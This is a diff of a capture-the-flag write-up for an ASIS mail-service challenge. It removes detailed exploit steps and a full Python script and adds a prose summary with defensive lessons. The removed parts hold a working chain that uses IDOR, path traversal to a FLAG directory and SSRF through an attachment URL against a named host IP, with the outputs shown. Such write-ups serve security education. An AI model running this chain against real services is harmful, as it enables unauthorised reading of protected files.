-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>grep<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;flag-[a-f0-9]\{32\}\.txt&quot;</span><span class="w"> </span>out.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>-c<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-rn<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-5
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">      </span><span class="m">7</span><span class="w"> </span>flag-0750c96cfc2bd4b665865da15e9d5b94.txt
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">      </span><span class="m">3</span><span class="w"> </span>flag-e528acb4157e8a50e1c2ab2e5b8266b0.txt
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">      </span><span class="m">2</span><span class="w"> </span>flag-ff1dfe516474072fdb4e0cd05a6aa670.txt
-</span></code></pre></div></p>
-<p><strong>Flag filename discovered:</strong> <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code></p>
-<h3 id="confirming-file-existence-via-hash-endpoint">Confirming File Existence via Hash Endpoint<a class="headerlink" href="#confirming-file-existence-via-hash-endpoint" title="Permanent link">&para;</a></h3>
-<p>We verified the file exists using the hash endpoint (which has no FLAG bucket check):</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash
-</span></code></pre></div>
-<p>Output:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Status: 200
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Response: {&quot;content&quot;:&quot;a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff&quot;,&quot;status&quot;:&quot;ok&quot;}
-</span></code></pre></div></p>
-<p>This confirms:
-- The file exists at <code>/data/FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code>
-- <strong>MD5 of flag content:</strong> <code>0750c96cfc2bd4b665865da15e9d5b94</code> (from filename)
-- <strong>SHA256 of flag content:</strong> <code>a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff</code></p>
-<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
-<h3 id="step-1-register-and-login">Step 1: Register and Login<a class="headerlink" href="#step-1-register-and-login" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;exploit_</span><span class="si">{</span><span class="n">random_string</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;ExploitPass123!&quot;</span>
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/register&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/login&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">)</span>
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;userId&quot;</span><span class="p">)</span>
-</span></code></pre></div>
-<p>Output:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>User: exploit_bzodmlyi (ID: 691)
-</span></code></pre></div></p>
-<h3 id="step-2-exploit-path-traversal-via-ssrf">Step 2: Exploit Path Traversal via SSRF<a class="headerlink" href="#step-2-exploit-path-traversal-via-ssrf" title="Permanent link">&para;</a></h3>
-<p>The key insight is using our own user ID as the bucket, then traversing to FLAG:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">ssrf_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://objectstore:8082/public/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt&quot;</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;message&gt;</span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="s1">    &lt;to&gt;</span><span class="si">{</span><span class="n">my_email</span><span class="si">}</span><span class="s1">&lt;/to&gt;</span>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="s1">    &lt;subject&gt;GetFlag&lt;/subject&gt;</span>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="s1">    &lt;body&gt;test&lt;/body&gt;</span>
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="s1">    &lt;attachment_url&gt;</span><span class="si">{</span><span class="n">ssrf_url</span><span class="si">}</span><span class="s1">&lt;/attachment_url&gt;</span>
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="s1">&lt;/message&gt;&#39;&#39;&#39;</span>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/compose&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;xml&quot;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">xml</span><span class="p">)})</span>
-</span></code></pre></div>
-<p>Output:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>[*] Own bucket traversal
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    URL: http://objectstore:8082/public/691/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>    Compose: 200 - {&quot;ok&quot;:true}
-</span></code></pre></div></p>
-<h3 id="step-3-retrieve-the-flag-from-inbox">Step 3: Retrieve the Flag from Inbox<a class="headerlink" href="#step-3-retrieve-the-flag-from-inbox" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/inbox&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">emails</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">emails</span><span class="p">:</span>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="n">email_resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/mail/</span><span class="si">{</span><span class="n">email</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    <span class="n">email_data</span> <span class="o">=</span> <span class="n">email_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    <span class="k">for</span> <span class="n">att</span> <span class="ow">in</span> <span class="n">email_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;attachments&quot;</span><span class="p">,</span> <span class="p">[]):</span>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>        <span class="n">att_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;/files</span><span class="si">{</span><span class="n">att</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}{</span><span class="n">att_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></code></pre></div>
-<p>Output:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>[Own bucket traversal]
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>    Name: flag-0750c96cfc2bd4b665865da15e9d5b94.txt
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    URL: /public/691/1bfbae05-71ca-46ae-8b34-5e10b62b39b6
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    Content (200): ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
-</span></code></pre></div></p>
-<h2 id="why-the-exploit-works">Why The Exploit Works<a class="headerlink" href="#why-the-exploit-works" title="Permanent link">&para;</a></h2>
+<p>But together, they formed a complete attack chain. I used IDOR to discover the flag filename, path traversal to access the protected FLAG directory, and SSRF to make the internal request that bypassed the nginx restrictions.</p>
+<p>The challenge also highlighted the importance of defense in depth. The bucket check was trying to protect the FLAG directory, but it only checked one part of the path. A better approach would have been:</p>
 <ol>
-<li>
-<p><strong>Bucket Check Bypass</strong>: The objectstore checks <code>if bucket == "FLAG"</code> but our request uses <code>bucket = "691"</code> (our user ID), which passes the check.</p>
-</li>
-<li>
-<p><strong>Path Resolution</strong>: The path <code>public/691/../FLAG/flag-xxx.txt</code> resolves to:</p>
-</li>
-<li><code>STORAGE / "691" / "../FLAG/flag-xxx.txt"</code></li>
-<li>
-<p>Which becomes <code>/data/FLAG/flag-xxx.txt</code></p>
-</li>
-<li>
-<p><strong>SSRF Stores Content</strong>: The API fetches the URL internally (bypassing nginx restrictions) and stores the response as an attachment in our bucket.</p>
-</li>
-<li>
-<p><strong>Public Access</strong>: Our bucket (<code>/public/691/</code>) is accessible without authentication, allowing us to retrieve the stored flag.</p>
-</li>
+<li>Normalize and resolve the full path before checking</li>
+<li>Ensure the final resolved path stays within the allowed directory</li>
+<li>Apply the same security checks at every layer (the hash endpoint was missing the FLAG check)</li>
 </ol>
-<h2 id="final-exploit-script">Final Exploit Script<a class="headerlink" href="#final-exploit-script" title="Permanent link">&para;</a></h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="ch">#!/usr/bin/env python3</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&quot;http://91.107.143.167:8081&quot;</span>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="n">FLAG_FILENAME</span> <span class="o">=</span> <span class="s2">&quot;flag-0750c96cfc2bd4b665865da15e9d5b94.txt&quot;</span>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">random_string</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">length</span><span class="p">))</span>
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="c1"># Register and login</span>
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>    <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;exploit_</span><span class="si">{</span><span class="n">random_string</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>    <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;ExploitPass123!&quot;</span>
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>
-</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/register&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
-</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/login&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
-</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>    <span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">)</span>
-</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;userId&quot;</span><span class="p">)</span>
-</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
-</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>    <span class="n">my_email</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">@asismail.local&quot;</span>
-</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>
-</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> (ID: </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
-</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
-</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>    <span class="c1"># SSRF with path traversal using our own bucket</span>
-</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>    <span class="n">ssrf_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://objectstore:8082/public/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">/../FLAG/</span><span class="si">{</span><span class="n">FLAG_FILENAME</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>
-</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>    <span class="n">xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;message&gt;</span>
-</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="s1">    &lt;to&gt;</span><span class="si">{</span><span class="n">my_email</span><span class="si">}</span><span class="s1">&lt;/to&gt;</span>
-</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a><span class="s1">    &lt;subject&gt;GetFlag&lt;/subject&gt;</span>
-</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a><span class="s1">    &lt;body&gt;flag&lt;/body&gt;</span>
-</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="s1">    &lt;attachment_url&gt;</span><span class="si">{</span><span class="n">ssrf_url</span><span class="si">}</span><span class="s1">&lt;/attachment_url&gt;</span>
-</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a><span class="s1">&lt;/message&gt;&#39;&#39;&#39;</span>
-</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>
-</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/compose&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;xml&quot;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">xml</span><span class="p">)})</span>
-</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Compose: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>
-</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a>
-</span><span id="__span-17-45"><a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a>    <span class="c1"># Retrieve flag from inbox</span>
-</span><span id="__span-17-46"><a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/inbox&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-17-47"><a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a>    <span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
-</span><span id="__span-17-48"><a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a>        <span class="k">if</span> <span class="n">email</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;subject&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;GetFlag&quot;</span><span class="p">:</span>
-</span><span id="__span-17-49"><a id="__codelineno-17-49" name="__codelineno-17-49" href="#__codelineno-17-49"></a>            <span class="n">email_resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/mail/</span><span class="si">{</span><span class="n">email</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-17-50"><a id="__codelineno-17-50" name="__codelineno-17-50" href="#__codelineno-17-50"></a>            <span class="n">email_data</span> <span class="o">=</span> <span class="n">email_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-17-51"><a id="__codelineno-17-51" name="__codelineno-17-51" href="#__codelineno-17-51"></a>
-</span><span id="__span-17-52"><a id="__codelineno-17-52" name="__codelineno-17-52" href="#__codelineno-17-52"></a>            <span class="k">for</span> <span class="n">att</span> <span class="ow">in</span> <span class="n">email_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;attachments&quot;</span><span class="p">,</span> <span class="p">[]):</span>
-</span><span id="__span-17-53"><a id="__codelineno-17-53" name="__codelineno-17-53" href="#__codelineno-17-53"></a>                <span class="n">att_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;/files</span><span class="si">{</span><span class="n">att</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
